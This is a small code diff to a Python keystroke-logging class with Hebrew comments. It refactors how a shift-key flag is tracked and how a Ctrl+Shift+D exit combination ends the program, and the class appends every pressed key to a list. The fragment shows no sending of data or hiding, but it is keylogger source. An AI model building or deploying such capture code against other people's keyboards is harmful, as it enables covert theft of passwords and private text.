@@ -26,28 +26,26 @@ class KeyLogger(IKeyLogger):
 
     def __init__(self):
         self.arr = list()
+        self.shift = False
 
     def __on_press(self,Key):
         """Handle the event when a key is pressed."""
         key_normalized = KeyLogger.normalize_key(Key)
         # print(key_nise)
         self.arr.append(key_normalized)
-        global shift
-        if Key == " shift ":
-            shift = True
+        if str(Key) == "Key.shift":
+            self.shift = True
+
         # פןנקציה שמפסיקה את התוכנה אם לחץ על קונטרול שיפט d
-    @staticmethod
-    def __on_release(key):
+    def __on_release(self,key):
         """Handle the event when a key is released."""
         try:
-            global shift
-            if key.char == ' shift ':
-                if key.char == '\x04':  # Ctrl+D
-                    print("Exiting...")
-                    os._exit(0)
-                shift = False
-        except AttributeError:
-            pass
+            if str(key.char) == '\x04' and self.shift:  # Ctrl+D+shift
+                print("Exiting...")
+                os._exit(0)
+            self.shift = False
+        except:
+            self.shift = False
 
     # אחראי ליפות את המקש
     @staticmethod
